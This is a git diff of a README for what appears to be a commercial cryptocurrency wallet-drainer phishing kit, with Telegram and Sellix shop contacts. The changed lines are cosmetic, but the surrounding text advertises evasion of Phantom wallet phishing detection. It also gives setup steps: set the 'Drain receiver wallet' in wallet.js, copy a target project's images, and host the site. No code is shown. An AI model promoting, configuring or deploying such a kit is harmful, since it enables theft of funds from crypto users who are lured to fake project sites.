@@ -17,7 +17,7 @@
 - [x] No contract required
 - [x] Anti Phantom Phishing Detections
 
-## `📂 Setup Guide`
+## ` 📂 Setup Guide `
 You need to edit the __**wallet.js**__ file to change the Drain receiver wallet.
 
 open all images folders and put your project images, but rename name as it was before.
@@ -26,7 +26,7 @@ After it, you're done. You only need to host the website to any hosting service
 
 To get instant support, contact us on [Telegram](https://t.me/zentoh)
 
-## `🌊 Socials`
+## ` 🌊 Socials `
 
 - Telegram: https://t.me/zentoh
 - Shop: https://tec.sellix.io
